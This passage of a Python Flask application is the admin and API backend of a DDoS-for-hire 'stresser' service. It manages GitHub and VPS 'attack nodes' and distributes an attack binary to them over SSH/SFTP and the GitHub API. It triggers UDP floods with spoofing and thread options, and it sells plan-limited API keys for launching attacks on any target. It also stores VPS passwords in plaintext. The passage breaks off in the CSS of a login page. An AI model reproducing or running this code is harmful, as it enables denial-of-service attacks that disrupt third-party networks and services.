        except GithubException:
            repo = user.create_repo(repo_name, private=False, auto_init=False)
            created = True
        if USE_MONGO:
            attack_nodes_col.insert_one({
                "name": name, "node_type": "github", "enabled": enabled,
                "github_token": token, "github_repo": f"{user.login}/{repo_name}",
                "github_username": user.login, "github_status": "active",
                "status_detail": "unknown", "binary_present": False,
                "attack_count": 0, "created_at": datetime.utcnow()
            })
        else:
            node = AttackNode(
                name=name, node_type='github', enabled=enabled,
                github_token=token, github_repo=f"{user.login}/{repo_name}",
                github_username=user.login, github_status='active'
            )
            db_sql.session.add(node)
            db_sql.session.commit()
        flash(f"GitHub node added! Repo {'created' if created else 'exists'}", 'success')
    except Exception as e:
        flash(f'Error: {str(e)}', 'danger')
    return redirect(url_for('admin_nodes'))

@app.route('/admin/nodes/add_vps', methods=['POST'])
@admin_required('nodes')
def admin_add_vps_node():
    name = request.form.get('name')
    host = request.form.get('vps_host')
    port = int(request.form.get('vps_port', 22))
    username = request.form.get('vps_username')
    password = request.form.get('vps_password')
    enabled = request.form.get('enabled') == 'on'
    if not name or not host or not username:
        flash('Name, host and username required', 'danger')
        return redirect(url_for('admin_nodes'))
    key_path = None
    if 'vps_key_file' in request.files:
        file = request.files['vps_key_file']
        if file and file.filename:
            key_dir = os.path.join(app.root_path, 'keys')
            safe_name = f"vps_{int(time.time())}_{random.randint(1000,9999)}.pem"
            key_path = os.path.join(key_dir, safe_name)
            file.save(key_path)
            os.chmod(key_path, 0o600)
    if USE_MONGO:
        attack_nodes_col.insert_one({
            "name": name, "node_type": "vps", "enabled": enabled,
            "vps_host": host, "vps_port": port, "vps_username": username,
            "vps_password": password, "vps_key_path": key_path,
            "status_detail": "unknown", "binary_present": False,
            "attack_count": 0, "created_at": datetime.utcnow()
        })
    else:
        node = AttackNode(name=name, node_type='vps', enabled=enabled,
                          vps_host=host, vps_port=port, vps_username=username,
                          vps_password=password, vps_key_path=key_path)
        db_sql.session.add(node)
        db_sql.session.commit()
    flash('VPS node added', 'success')
    return redirect(url_for('admin_nodes'))

@app.route('/admin/nodes/<node_id>/check', methods=['POST'])
@admin_required('nodes')
def admin_check_node(node_id):
    if USE_MONGO:
        node = attack_nodes_col.find_one({"_id": ObjectId(node_id)})
    else:
        node = AttackNode.query.get(node_id)
    if node:
        if (node['node_type'] if USE_MONGO else node.node_type) == 'github':
            result = test_github_node_detailed(node)
        else:
            result = test_vps_node_detailed(node)
        flash(f"Node {node['name'] if USE_MONGO else node.name}: {result['message']}", 'info')
    else:
        flash('Node not found', 'danger')
    return redirect(url_for('admin_nodes'))

@app.route('/admin/nodes/<node_id>/toggle', methods=['POST'])
@admin_required('nodes')
def admin_toggle_node(node_id):
    if USE_MONGO:
        node = attack_nodes_col.find_one({"_id": ObjectId(node_id)})
        if node:
            attack_nodes_col.update_one({"_id": ObjectId(node_id)}, {"$set": {"enabled": not node['enabled']}})
            flash('Node toggled', 'success')
        else:
            flash('Node not found', 'danger')
    else:
        node = AttackNode.query.get(node_id)
        if node:
            node.enabled = not node.enabled
            db_sql.session.commit()
            flash('Node toggled', 'success')
        else:
            flash('Node not found', 'danger')
    return redirect(url_for('admin_nodes'))

@app.route('/admin/nodes/<node_id>/delete', methods=['POST'])
@admin_required('nodes')
def admin_delete_node(node_id):
    if USE_MONGO:
        node = attack_nodes_col.find_one({"_id": ObjectId(node_id)})
        if node:
            if node.get('vps_key_path') and os.path.exists(node['vps_key_path']):
                try:
                    os.remove(node['vps_key_path'])
                except:
                    pass
            attack_nodes_col.delete_one({"_id": ObjectId(node_id)})
            flash('Node deleted', 'success')
        else:
            flash('Node not found', 'danger')
    else:
        node = AttackNode.query.get(node_id)
        if node:
            if node.vps_key_path and os.path.exists(node.vps_key_path):
                try:
                    os.remove(node.vps_key_path)
                except:
                    pass
            db_sql.session.delete(node)
            db_sql.session.commit()
            flash('Node deleted', 'success')
        else:
            flash('Node not found', 'danger')
    return redirect(url_for('admin_nodes'))

@app.route('/admin/upload_binary', methods=['POST'])
@admin_required('nodes')
def admin_upload_binary():
    if 'binary' not in request.files:
        flash('No file selected', 'danger')
        return redirect(url_for('admin_nodes'))
    file = request.files['binary']
    if file.filename == '':
        flash('No file selected', 'danger')
        return redirect(url_for('admin_nodes'))
    binary_data = file.read()
    if not binary_data:
        flash('Empty file', 'danger')
        return redirect(url_for('admin_nodes'))
    if USE_MONGO:
        nodes = list(attack_nodes_col.find({"enabled": True}))
    else:
        nodes = AttackNode.query.filter_by(enabled=True).all()
    if not nodes:
        flash('No enabled nodes', 'warning')
        return redirect(url_for('admin_nodes'))
    success = 0
    for node in nodes:
        try:
            if (node['node_type'] if USE_MONGO else node.node_type) == 'github':
                token = node['github_token'] if USE_MONGO else node.github_token
                repo_name = node['github_repo'] if USE_MONGO else node.github_repo
                g = Github(token)
                repo = g.get_repo(repo_name)
                try:
                    contents = repo.get_contents("ultimate", ref="main")
                    repo.update_file("ultimate", "Update binary", binary_data, contents.sha, branch="main")
                except:
                    repo.create_file("ultimate", "Add binary", binary_data, branch="main")
                if USE_MONGO:
                    attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {"binary_present": True}})
                else:
                    node.binary_present = True
                    db_sql.session.commit()
                success += 1
            else:
                host = node['vps_host'] if USE_MONGO else node.vps_host
                port = node['vps_port'] if USE_MONGO else node.vps_port
                username = node['vps_username'] if USE_MONGO else node.vps_username
                password = node.get('vps_password') if USE_MONGO else node.vps_password
                key_path = node.get('vps_key_path') if USE_MONGO else node.vps_key_path
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                if key_path and os.path.exists(key_path):
                    ssh.connect(host, port=port, username=username, key_filename=key_path)
                elif password:
                    ssh.connect(host, port=port, username=username, password=password)
                else:
                    continue
                stdin, stdout, stderr = ssh.exec_command("whoami")
                user = stdout.read().decode().strip()
                if user == "root":
                    remote_path = "/root/ultimate"
                else:
                    remote_path = f"/home/{user}/ultimate"
                    ssh.exec_command(f"mkdir -p /home/{user}")
                sftp = ssh.open_sftp()
                sftp.putfo(io.BytesIO(binary_data), remote_path)
                sftp.chmod(remote_path, 0o755)
                sftp.close()
                ssh.close()
                if USE_MONGO:
                    attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {"binary_present": True, "status_detail": "active"}})
                else:
                    node.binary_present = True
                    node.status_detail = 'active'
                    db_sql.session.commit()
                success += 1
        except Exception as e:
            print(f"Upload failed for {node.get('name', 'unknown')}: {e}")
    flash(f'Binary distributed to {success}/{len(nodes)} nodes', 'success')
    return redirect(url_for('admin_nodes'))

@app.route('/admin/keys')
@admin_required('keys')
def admin_keys():
    if USE_MONGO:
        keys = list(generated_keys_col.find().sort("created_at", -1))
    else:
        keys = GeneratedKey.query.order_by(GeneratedKey.created_at.desc()).all()
    return render_template_string(ADMIN_KEYS_HTML, keys=keys, plans=PLANS)

@app.route('/admin/keys/generate', methods=['POST'])
@admin_required('keys')
def generate_keys():
    plan_name = request.form.get('plan', 'Pro Plan')
    days = int(request.form.get('days', 30))
    count = int(request.form.get('count', 1))
    plan = next((p for p in PLANS if p['name'] == plan_name), PLANS[1])
    prefix = plan['key_prefix']
    keys_created = []
    for _ in range(count):
        key_str = f"{prefix}-{secrets.token_hex(4).upper()}"
        if USE_MONGO:
            generated_keys_col.insert_one({
                "key": key_str, "plan": plan_name, "duration_days": days,
                "created_by": session.get('admin_id'), "created_at": datetime.utcnow(),
                "active": True, "used_by": None
            })
        else:
            key = GeneratedKey(key=key_str, plan=plan_name, duration_days=days, created_by=session['admin_id'])
            db_sql.session.add(key)
        keys_created.append(key_str)
    if not USE_MONGO:
        db_sql.session.commit()
    flash(f"Generated {count} key(s) for {plan_name}: {', '.join(keys_created)}", 'success')
    return redirect(url_for('admin_keys'))

@app.route('/admin/keys/<key_id>/delete', methods=['POST'])
@admin_required('keys')
def delete_key(key_id):
    if USE_MONGO:
        generated_keys_col.delete_one({"_id": ObjectId(key_id)})
    else:
        key = GeneratedKey.query.get(key_id)
        if key:
            db_sql.session.delete(key)
            db_sql.session.commit()
    flash('Key deleted', 'success')
    return redirect(url_for('admin_keys'))

@app.route('/admin/settings')
@admin_required('settings')
def admin_settings():
    if USE_MONGO:
        stats = {
            'users': users_col.count_documents({}),
            'api_keys': api_keys_col.count_documents({}),
            'attack_logs': attack_logs_col.count_documents({}),
            'attack_nodes': attack_nodes_col.count_documents({}),
            'generated_keys': generated_keys_col.count_documents({}),
            'db_size': db.command("dbStats").get("dataSize", 0)
        }
    else:
        stats = {
            'users': User.query.count(),
            'api_keys': ApiKey.query.count(),
            'attack_logs': AttackLog.query.count(),
            'attack_nodes': AttackNode.query.count(),
            'generated_keys': GeneratedKey.query.count(),
            'db_size': os.path.getsize('stresser.db') if os.path.exists('stresser.db') else 0
        }
    return render_template_string(ADMIN_SETTINGS_HTML,
                                  maintenance=MAINTENANCE_MODE,
                                  cooldown=GLOBAL_COOLDOWN,
                                  max_duration=MAX_ATTACK_DURATION,
                                  default_threads=DEFAULT_THREADS,
                                  max_threads=MAX_THREADS_LIMIT,
                                  stats=stats)

@app.route('/admin/settings/update', methods=['POST'])
@admin_required('settings')
def admin_settings_update():
    global MAINTENANCE_MODE, GLOBAL_COOLDOWN, MAX_ATTACK_DURATION, DEFAULT_THREADS, MAX_THREADS_LIMIT
    action = request.form.get('action')
    if action == 'change_password':
        new_pass = request.form.get('new_password')
        confirm_pass = request.form.get('confirm_password')
        if new_pass != confirm_pass:
            flash('Passwords do not match', 'danger')
        elif len(new_pass) < 6:
            flash('Password must be at least 6 characters', 'danger')
        else:
            if USE_MONGO:
                admin_users_col.update_one(
                    {"_id": ObjectId(session['admin_id'])},
                    {"$set": {"password_hash": generate_password_hash(new_pass)}}
                )
            else:
                admin = AdminUser.query.get(session['admin_id'])
                if admin:
                    admin.password_hash = generate_password_hash(new_pass)
                    db_sql.session.commit()
            flash('Admin password changed successfully', 'success')
    elif action == 'toggle_maintenance':
        MAINTENANCE_MODE = not MAINTENANCE_MODE
        flash(f'Maintenance mode {"enabled" if MAINTENANCE_MODE else "disabled"}', 'success')
    elif action == 'update_config':
        GLOBAL_COOLDOWN = int(request.form.get('cooldown', 30))
        MAX_ATTACK_DURATION = int(request.form.get('max_duration', 300))
        DEFAULT_THREADS = int(request.form.get('default_threads', 1500))
        MAX_THREADS_LIMIT = int(request.form.get('max_threads', 10000))
        flash('Global configuration updated', 'success')
    elif action == 'broadcast':
        message = request.form.get('message')
        flash(f'Broadcast sent to all users: {message[:50]}...', 'info')
    return redirect(url_for('admin_settings'))

@app.route('/admin/settings/clear/<collection>', methods=['POST'])
@admin_required('settings')
def admin_clear_collection(collection):
    if USE_MONGO:
        if collection == 'users':
            users_col.delete_many({"role": {"$ne": "admin"}})
            flash('All non-admin users cleared', 'success')
        elif collection == 'api_keys':
            api_keys_col.delete_many({})
            flash('All API keys cleared', 'success')
        elif collection == 'attack_logs':
            attack_logs_col.delete_many({})
            flash('All attack logs cleared', 'success')
        elif collection == 'attack_nodes':
            attack_nodes_col.delete_many({})
            flash('All attack nodes cleared', 'success')
        elif collection == 'generated_keys':
            generated_keys_col.delete_many({})
            flash('All generated keys cleared', 'success')
    else:
        if collection == 'users':
            User.query.filter(User.role != 'admin').delete()
            db_sql.session.commit()
            flash('All non-admin users cleared', 'success')
        elif collection == 'api_keys':
            ApiKey.query.delete()
            db_sql.session.commit()
            flash('All API keys cleared', 'success')
        elif collection == 'attack_logs':
            AttackLog.query.delete()
            db_sql.session.commit()
            flash('All attack logs cleared', 'success')
        elif collection == 'attack_nodes':
            AttackNode.query.delete()
            db_sql.session.commit()
            flash('All attack nodes cleared', 'success')
        elif collection == 'generated_keys':
            GeneratedKey.query.delete()
            db_sql.session.commit()
            flash('All generated keys cleared', 'success')
    return redirect(url_for('admin_settings'))

@app.route('/admin/test-attack', methods=['GET', 'POST'])
@admin_required('test_attack')
def admin_test_attack():
    if request.method == 'POST':
        target = request.form.get('target')
        port = int(request.form.get('port'))
        duration = int(request.form.get('duration'))
        method = request.form.get('method', 'udp')
        mode = request.form.get('mode', 'default')
        threads = int(request.form.get('threads', DEFAULT_THREADS))
        random_ports = 1 if request.form.get('random_ports') else 0
        random_delay = 1 if request.form.get('random_delay') else 0
        spoof = 1 if request.form.get('spoof') else 0
        flood = 1 if request.form.get('flood') else 0
        pps_limit = int(request.form.get('pps_limit', 0))

        if duration > 30:
            flash('Test duration limited to 30 seconds', 'warning')
            duration = 30

        if USE_MONGO:
            github_nodes = list(attack_nodes_col.find({"enabled": True, "node_type": "github"}))
            vps_nodes = list(attack_nodes_col.find({"enabled": True, "node_type": "vps"}))
        else:
            github_nodes = AttackNode.query.filter_by(enabled=True, node_type='github').all()
            vps_nodes = AttackNode.query.filter_by(enabled=True, node_type='vps').all()

        results = []
        github_success = 0
        vps_success = 0

        for node in github_nodes:
            node_name = node['name'] if USE_MONGO else node.name
            try:
                if trigger_github_attack(node, target, port, duration, method, threads, mode,
                                         random_ports, random_delay, spoof, flood, pps_limit):
                    results.append({'name': node_name, 'type': 'GitHub', 'status': '✅ Success', 'details': ''})
                    github_success += 1
                else:
                    results.append({'name': node_name, 'type': 'GitHub', 'status': '❌ Failed', 'details': 'Trigger returned False'})
            except Exception as e:
                results.append({'name': node_name, 'type': 'GitHub', 'status': '❌ Error', 'details': str(e)[:50]})

        for node in vps_nodes:
            node_name = node['name'] if USE_MONGO else node.name
            try:
                if trigger_vps_attack(node, target, port, duration, method, threads, mode,
                                      random_ports, random_delay, spoof, flood, pps_limit):
                    results.append({'name': node_name, 'type': 'VPS', 'status': '✅ Success', 'details': ''})
                    vps_success += 1
                else:
                    results.append({'name': node_name, 'type': 'VPS', 'status': '❌ Failed', 'details': 'Trigger returned False'})
            except Exception as e:
                results.append({'name': node_name, 'type': 'VPS', 'status': '❌ Error', 'details': str(e)[:50]})

        flash(f'Test completed: GitHub {github_success}/{len(github_nodes)} | VPS {vps_success}/{len(vps_nodes)}', 'info')
        return render_template_string(ADMIN_TEST_ATTACK_HTML,
                                      results=results, target=target, port=port, duration=duration,
                                      method=method, mode=mode, threads=threads,
                                      github_total=len(github_nodes), vps_total=len(vps_nodes),
                                      github_success=github_success, vps_success=vps_success,
                                      methods=ATTACK_METHODS)

    return render_template_string(ADMIN_TEST_ATTACK_HTML, results=None, methods=ATTACK_METHODS)

@app.route('/admin/test-attack/single', methods=['POST'])
@admin_required('test_attack')
def admin_test_single_node():
    node_id = request.form.get('single_node')
    target = request.form.get('target', '127.0.0.1')
    port = int(request.form.get('port', 443))
    duration = min(int(request.form.get('duration', 5)), 10)
    method = request.form.get('method', 'udp')
    mode = request.form.get('mode', 'default')
    threads = int(request.form.get('threads', 500))
    random_ports = 1 if request.form.get('random_ports') else 0
    random_delay = 1 if request.form.get('random_delay') else 0
    spoof = 1 if request.form.get('spoof') else 0
    flood = 1 if request.form.get('flood') else 0
    pps_limit = int(request.form.get('pps_limit', 0))

    if USE_MONGO:
        node = attack_nodes_col.find_one({"_id": ObjectId(node_id)})
    else:
        node = AttackNode.query.get(node_id)

    if not node:
        return jsonify({'status': 'error', 'message': 'Node not found'}), 404

    node_name = node['name'] if USE_MONGO else node.name
    node_type = node['node_type'] if USE_MONGO else node.node_type

    try:
        if node_type == 'github':
            success = trigger_github_attack(node, target, port, duration, method, threads, mode,
                                            random_ports, random_delay, spoof, flood, pps_limit)
        else:
            success = trigger_vps_attack(node, target, port, duration, method, threads, mode,
                                         random_ports, random_delay, spoof, flood, pps_limit)

        if success:
            return jsonify({'status': 'success', 'message': f'Attack launched on {node_name}'})
        else:
            return jsonify({'status': 'failed', 'message': 'Attack trigger returned False'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)[:100]})

# ==================== ADMIN MANAGE ROUTES ====================
@app.route('/admin/manage')
@admin_required('manage_admins')
def admin_manage():
    if USE_MONGO:
        admins = list(admin_users_col.find())
    else:
        admins = AdminUser.query.all()
    can_manage = session.get('admin_is_super', False) or 'manage_admins' in session.get('admin_permissions', [])
    return render_template_string(ADMIN_MANAGE_HTML, admins=admins, USE_MONGO=USE_MONGO, can_manage_admins=can_manage)

@app.route('/admin/manage/add', methods=['POST'])
@admin_required('manage_admins')
def admin_manage_add():
    username = request.form.get('username')
    password = request.form.get('password')
    is_super = request.form.get('is_super') == 'on'
    permissions = request.form.getlist('permissions')

    if not username or not password:
        flash('Username and password required', 'danger')
        return redirect(url_for('admin_manage'))

    if USE_MONGO:
        if admin_users_col.find_one({"username": username}):
            flash('Username already exists', 'danger')
            return redirect(url_for('admin_manage'))
        admin_users_col.insert_one({
            "username": username,
            "password_hash": generate_password_hash(password),
            "permissions": permissions,
            "is_super": is_super,
            "created_at": datetime.utcnow()
        })
    else:
        if AdminUser.query.filter_by(username=username).first():
            flash('Username already exists', 'danger')
            return redirect(url_for('admin_manage'))
        admin = AdminUser(
            username=username,
            password_hash=generate_password_hash(password),
            permissions=json.dumps(permissions),
            is_super=is_super
        )
        db_sql.session.add(admin)
        db_sql.session.commit()
    flash(f'Admin {username} created', 'success')
    return redirect(url_for('admin_manage'))

@app.route('/admin/manage/edit/<admin_id>', methods=['POST'])
@admin_required('manage_admins')
def admin_manage_edit(admin_id):
    is_super = request.form.get('is_super') == 'on'
    permissions = request.form.getlist('permissions')

    if USE_MONGO:
        admin_users_col.update_one(
            {"_id": ObjectId(admin_id)},
            {"$set": {"permissions": permissions, "is_super": is_super}}
        )
    else:
        admin = AdminUser.query.get(admin_id)
        if admin:
            admin.permissions = json.dumps(permissions)
            admin.is_super = is_super
            db_sql.session.commit()
    flash('Admin updated', 'success')
    return redirect(url_for('admin_manage'))

@app.route('/admin/manage/delete/<admin_id>', methods=['POST'])
@admin_required('manage_admins')
def admin_manage_delete(admin_id):
    if (USE_MONGO and str(admin_id) == session.get('admin_id')) or (not USE_MONGO and int(admin_id) == session.get('admin_id')):
        flash('You cannot delete your own account', 'danger')
        return redirect(url_for('admin_manage'))

    if USE_MONGO:
        admin_users_col.delete_one({"_id": ObjectId(admin_id)})
    else:
        admin = AdminUser.query.get(admin_id)
        if admin:
            db_sql.session.delete(admin)
            db_sql.session.commit()
    flash('Admin deleted', 'success')
    return redirect(url_for('admin_manage'))

# ==================== API KEY MANAGEMENT ROUTES ====================
@app.route('/admin/api_keys')
@admin_required('keys')
def admin_api_keys():
    if USE_MONGO:
        keys = list(api_keys_col.find())
        user_map = {}
        for k in keys:
            uid = k.get('user_id')
            if uid:
                user = users_col.find_one({"_id": uid})
                user_map[str(uid)] = user['token'][:16] + '...' if user else 'Unknown'
    else:
        keys = ApiKey.query.order_by(ApiKey.created_at.desc()).all()
        user_map = {k.user_id: (User.query.get(k.user_id).token[:16] + '...' if k.user_id and User.query.get(k.user_id) else 'N/A') for k in keys}
    return render_template_string(ADMIN_API_KEYS_HTML, keys=keys, plans=PLANS, user_map=user_map, USE_MONGO=USE_MONGO)

@app.route('/admin/api_keys/create', methods=['POST'])
@admin_required('keys')
def admin_create_api_key():
    user_id = request.form.get('user_id')
    name = request.form.get('name', 'API Key')
    plan_name = request.form.get('plan_name')
    custom_concurrent = request.form.get('custom_concurrent')
    custom_duration = request.form.get('custom_duration')
    custom_threads = request.form.get('custom_threads')
    expires_days = request.form.get('expires_days')

    if not user_id:
        flash('User ID is required', 'danger')
        return redirect(url_for('admin_api_keys'))

    max_concurrent = None
    max_duration = None
    max_threads = None
    if plan_name and plan_name != 'custom':
        plan = next((p for p in PLANS if p['name'] == plan_name), None)
        if plan:
            max_concurrent = plan['concurrent']
            max_duration = plan['duration']
            max_threads = plan['threads']
    else:
        max_concurrent = int(custom_concurrent) if custom_concurrent else None
        max_duration = int(custom_duration) if custom_duration else None
        max_threads = int(custom_threads) if custom_threads else None

    expires_at = None
    if expires_days and expires_days.isdigit():
        expires_at = datetime.utcnow() + timedelta(days=int(expires_days))

    new_key = secrets.token_urlsafe(32)

    if USE_MONGO:
        api_keys_col.insert_one({
            "user_id": ObjectId(user_id),
            "key": new_key,
            "name": name,
            "plan_name": plan_name if plan_name != 'custom' else None,
            "max_concurrent": max_concurrent,
            "max_duration": max_duration,
            "max_threads": max_threads,
            "expires_at": expires_at,
            "active": True,
            "last_used": None,
            "total_attacks": 0,
            "created_at": datetime.utcnow()
        })
    else:
        api_key = ApiKey(
            user_id=int(user_id),
            key=new_key,
            name=name,
            plan_name=plan_name if plan_name != 'custom' else None,
            max_concurrent=max_concurrent,
            max_duration=max_duration,
            max_threads=max_threads,
            expires_at=expires_at,
            active=True
        )
        db_sql.session.add(api_key)
        db_sql.session.commit()

    flash(f'API Key created! Copy it now: {new_key}', 'success')
    return redirect(url_for('admin_api_keys'))

@app.route('/admin/api_keys/<key_id>/delete', methods=['POST'])
@admin_required('keys')
def admin_delete_api_key(key_id):
    if USE_MONGO:
        api_keys_col.delete_one({"_id": ObjectId(key_id)})
    else:
        key = ApiKey.query.get(key_id)
        if key:
            db_sql.session.delete(key)
            db_sql.session.commit()
    flash('API Key deleted', 'success')
    return redirect(url_for('admin_api_keys'))

@app.route('/admin/api_keys/<key_id>/toggle', methods=['POST'])
@admin_required('keys')
def admin_toggle_api_key(key_id):
    if USE_MONGO:
        key = api_keys_col.find_one({"_id": ObjectId(key_id)})
        if key:
            api_keys_col.update_one({"_id": ObjectId(key_id)}, {"$set": {"active": not key.get('active', True)}})
    else:
        key = ApiKey.query.get(key_id)
        if key:
            key.active = not key.active
            db_sql.session.commit()
    flash('API Key toggled', 'success')
    return redirect(url_for('admin_api_keys'))

# ==================== API ATTACK ENDPOINT ====================
@app.route('/api/attack', methods=['POST'])
def api_attack():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'Invalid JSON'}), 400

    api_key = data.get('api_key')
    target = data.get('target')
    port = data.get('port')
    duration = data.get('duration')
    method = data.get('method', 'udp')
    mode = data.get('mode', 'default')
    threads = data.get('threads', DEFAULT_THREADS)
    concurrent = data.get('concurrent', 1)
    random_ports = data.get('random_ports', 0)
    random_delay = data.get('random_delay', 0)
    spoof = data.get('spoof', 0)
    flood = data.get('flood', 0)
    pps_limit = data.get('pps_limit', 0)

    if not all([api_key, target, port, duration]):
        return jsonify({'error': 'Missing parameters'}), 400

    if USE_MONGO:
        key_obj = api_keys_col.find_one({"key": api_key})
    else:
        key_obj = ApiKey.query.filter_by(key=api_key).first()

    if not key_obj:
        return jsonify({'error': 'Invalid API key'}), 401

    if not key_obj.get('active', True):
        return jsonify({'error': 'API key is inactive'}), 403

    expires = key_obj.get('expires_at')
    if expires and expires < datetime.utcnow():
        return jsonify({'error': 'API key expired'}), 403

    user_id = key_obj.get('user_id')
    if USE_MONGO:
        user = users_col.find_one({"_id": user_id})
    else:
        user = User.query.get(user_id)

    if not user:
        return jsonify({'error': 'User not found'}), 404

    if key_obj.get('max_duration') is not None:
        max_dur = key_obj['max_duration']
    else:
        max_dur = user.get('max_duration', 60) if USE_MONGO else user.max_duration

    if key_obj.get('max_concurrent') is not None:
        max_conc = key_obj['max_concurrent']
    else:
        max_conc = user.get('max_concurrent', 1) if USE_MONGO else user.max_concurrent

    if key_obj.get('max_threads') is not None:
        max_thr = key_obj['max_threads']
    else:
        max_thr = user.get('max_threads', 1500) if USE_MONGO else user.max_threads

    if duration > max_dur:
        return jsonify({'error': f'Max duration {max_dur}s'}), 400
    if threads > max_thr:
        return jsonify({'error': f'Max threads {max_thr}'}), 400
    if concurrent > max_conc:
        return jsonify({'error': f'Max concurrent {max_conc}'}), 400

    slots_used = user.get('slots_used', 0) if USE_MONGO else user.slots_used
    if slots_used + concurrent > max_conc:
        return jsonify({'error': 'No free slots'}), 429

    with attack_lock:
        attack_queue.append({
            'user_id': user_id,
            'target': target,
            'port': port,
            'duration': duration,
            'method': method,
            'mode': mode,
            'threads': threads,
            'concurrent': concurrent,
            'random_ports': random_ports,
            'random_delay': random_delay,
            'spoof': spoof,
            'flood': flood,
            'pps_limit': pps_limit,
            'source': 'api'
        })
        global is_attacking
        if not is_attacking:
            is_attacking = True
            threading.Thread(target=process_attack_queue).start()

    if USE_MONGO:
        users_col.update_one(
            {"_id": user_id},
            {"$set": {"last_attack": datetime.utcnow()}, "$inc": {"slots_used": concurrent}}
        )
        api_keys_col.update_one(
            {"_id": key_obj['_id']},
            {"$set": {"last_used": datetime.utcnow()}, "$inc": {"total_attacks": 1}}
        )
    else:
        user.last_attack = datetime.utcnow()
        user.slots_used += concurrent
        key_obj.last_used = datetime.utcnow()
        key_obj.total_attacks += 1
        db_sql.session.commit()

    return jsonify({
        'status': 'queued',
        'position': len(attack_queue),
        'duration': duration,
        'endsAt': (datetime.utcnow() + timedelta(seconds=duration)).isoformat()
    }), 200

# ==================== LIVE STATUS APIs ====================
@app.route('/admin/nodes/status/all')
@admin_required('dashboard')
def admin_nodes_status_all():
    if USE_MONGO:
        nodes = list(attack_nodes_col.find())
    else:
        nodes = AttackNode.query.all()
    result = []
    for node in nodes:
        if USE_MONGO:
            result.append({
                'id': str(node['_id']), 'name': node['name'], 'type': node['node_type'],
                'enabled': node.get('enabled', True), 'status': node.get('status_detail', 'unknown'),
                'binary': node.get('binary_present', False), 'attack_count': node.get('attack_count', 0)
            })
        else:
            result.append({
                'id': node.id, 'name': node.name, 'type': node.node_type,
                'enabled': node.enabled, 'status': node.status_detail or 'unknown',
                'binary': node.binary_present, 'attack_count': node.attack_count
            })
    return jsonify(result)

@app.route('/admin/nodes/<node_id>/test', methods=['POST'])
@admin_required('nodes')
def admin_test_node_ajax(node_id):
    if USE_MONGO:
        node = attack_nodes_col.find_one({"_id": ObjectId(node_id)})
    else:
        node = AttackNode.query.get(node_id)
    if not node:
        return jsonify({'error': 'Node not found'}), 404
    if (node['node_type'] if USE_MONGO else node.node_type) == 'vps':
        result = test_vps_node_detailed(node)
    else:
        result = test_github_node_detailed(node)
    return jsonify(result)

@app.route('/admin/attack/status')
@admin_required('dashboard')
def admin_attack_status():
    with attack_lock:
        queue_len = len(attack_queue)
        cur = current_attack.copy() if current_attack else None
    return jsonify({'is_attacking': is_attacking, 'queue_length': queue_len, 'current_attack': cur})

@app.route('/admin/attack/stop', methods=['POST'])
@admin_required('dashboard')
def admin_stop_attack():
    global is_attacking, current_attack
    with attack_lock:
        attack_queue.clear()
        is_attacking = False
        current_attack = None
    flash('Attack queue cleared', 'success')
    return redirect(url_for('admin_dashboard'))

LOGIN_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
<title>Login • Access Portal</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Syne:wght@700;800&display=swap" rel="stylesheet">
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  :root {
    --bg: #020408;
    --surface: rgba(8, 18, 32, 0.75);
    --border: rgba(0, 220, 170, 0.18);
    --accent: #00dcaa;
    --accent2: #00aaff;
    --text: #e8f4f0;
    --muted: rgba(200, 230, 220, 0.45);
    --error: #ff4d6d;
    --success: #00dcaa;
    --radius: 28px;
  }

  body {
    background: var(--bg);
    font-family: 'Space Grotesk', sans-serif;
    color: var(--text);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 24px;
    overflow: hidden;
    position: relative;
  }

  /* Animated background */
  .bg-orbs {
    position: fixed;
    inset: 0;
    z-index: 0;
    pointer-events: none;
  }
  .orb {
    position: absolute;
    border-radius: 50%;
    filter: blur(80px);
    opacity: 0.25;
    animation: drift linear infinite;
  }
  .orb-1 { width: 500px; height: 500px; background: radial-gradient(circle, #00dcaa, transparent); top: -150px; left: -100px; animation-duration: 18s; }
  .orb-2 { width: 400px; height: 400px; background: radial-gradient(circle, #00aaff, transparent); bottom: -120px; right: -80px; animation-duration: 22s; animation-direction: reverse; }
  .orb-3 { width: 300px; height: 300px; background: radial-gradient(circle, #7040ff, transparent); top: 40%; left: 50%; animation-duration: 28s; opacity: 0.15; }

  @keyframes drift {
    0%   { transform: translate(0, 0) scale(1); }
    33%  { transform: translate(40px, -30px) scale(1.08); }
    66%  { transform: translate(-30px, 20px) scale(0.95); }
    100% { transform: translate(0, 0) scale(1); }
  }

  /* Grid lines */
  .grid-bg {
    position: fixed;
    inset: 0;
    z-index: 0;
    background-image:
      linear-gradient(rgba(0,220,170,0.04) 1px, transparent 1px),
      linear-gradient(90deg, rgba(0,220,170,0.04) 1px, transparent 1px);
    background-size: 48px 48px;
    pointer-events: none;
  }

  /* Card */
  .card {
    position: relative;
    z-index: 10;
    background: var(--surface);
    backdrop-filter: blur(20px) saturate(1.4);
    -webkit-backdrop-filter: blur(20px) saturate(1.4);
    border: 1px solid var(--border);
    border-radius: var(--radius);
    padding: 48px 44px;
    width: 100%;
    max-width: 460px;
    box-shadow:
      0 0 0 1px rgba(0,220,170,0.06),
      0 30px 60px rgba(0,0,0,0.5),
      0 0 80px rgba(0,220,170,0.06) inset;
    animation: slideUp 0.7s cubic-bezier(0.22, 1, 0.36, 1) both;
  }

  @keyframes slideUp {
    from { opacity: 0; transform: translateY(32px) scale(0.97); }
    to   { opacity: 1; transform: translateY(0) scale(1); }
  }

  /* Corner decorations */
  .card::before {
    content: '';
    position: absolute;
    top: -1px; left: -1px;
    width: 80px; height: 80px;
    border-top: 2px solid var(--accent);
    border-left: 2px solid var(--accent);
    border-radius: var(--radius) 0 0 0;
    opacity: 0.7;
  }
  .card::after {
    content: '';
    position: absolute;
    bottom: -1px; right: -1px;
    width: 80px; height: 80px;
    border-bottom: 2px solid var(--accent2);
    border-right: 2px solid var(--accent2);
    border-radius: 0 0 var(--radius) 0;
    opacity: 0.7;
  }

  /* Header */
  .header {
    text-align: center;
    margin-bottom: 36px;
  }
  .logo-icon {
